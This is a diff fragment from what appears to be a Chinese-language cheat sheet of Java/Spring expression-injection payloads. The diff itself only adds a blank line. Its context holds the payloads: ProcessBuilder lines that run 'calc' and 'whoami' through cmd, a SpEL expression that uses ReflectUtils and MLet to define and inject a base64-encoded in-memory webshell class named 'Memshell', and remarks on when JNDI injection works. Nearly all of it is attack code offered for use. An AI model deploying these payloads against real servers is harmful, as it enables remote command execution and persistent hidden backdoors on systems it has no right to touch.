@@ -14,6 +14,7 @@ new+java.lang.ProcessBuilder("cmd","/c","Calc").start()
 new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine()
 
 可以打入内存马高版本Spring Core 受限
+
 #{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
 
 使用JNDI 注入利用 在Springboot 中不适用，因为它会程序启动时初始化InitialContext
